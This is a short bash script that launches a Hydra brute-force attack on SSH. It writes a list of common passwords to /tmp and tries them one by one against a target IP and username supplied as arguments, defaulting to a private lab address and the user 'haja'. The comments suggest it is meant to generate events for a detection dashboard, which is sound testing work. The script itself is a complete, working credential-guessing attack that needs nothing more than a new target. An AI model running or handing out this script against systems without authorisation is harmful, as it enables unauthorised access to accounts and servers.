#!/bin/bash
# Hydra Brute Force Attack Script
# Usage: ./attack_hydra.sh <TARGET_IP> [USERNAME]

TARGET=${1:-"10.134.225.6"}
USER=${2:-"haja"}

GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}=========================================="
echo -e "   HYDRA BRUTE FORCE ATTACK"
echo -e "==========================================${NC}"
echo -e "  Target : ${CYAN}$TARGET${NC}"
echo -e "  User   : ${CYAN}$USER${NC}"
echo ""

# Check for hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] hydra is not installed.${NC}"
    echo "    Install: sudo apt install hydra"
    exit 1
fi

# Create password list
echo -e "${GREEN}[*] Creating password list...${NC}"
cat > /tmp/passlist.txt << EOF
password123
admin
letmein
123456
root
qwerty
test1234
welcome
monkey
dragon
EOF

echo -e "${GREEN}[*] Launching Hydra...${NC}"
echo -e "    Command: hydra -l $USER -P /tmp/passlist.txt ssh://$TARGET -t 1 -w 3"
echo ""

# -t 1 : Single thread (one attempt at a time for clean dashboard progression)
# -w 3 : 3 second wait between attempts
hydra -l "$USER" -P /tmp/passlist.txt ssh://"$TARGET" -t 1 -w 3

echo ""
echo -e "${RED}=========================================="
echo -e "   ATTACK COMPLETE"
echo -e "==========================================${NC}"
echo -e "${GREEN}Check your dashboard for detection events!${NC}"

rm -f /tmp/passlist.txt
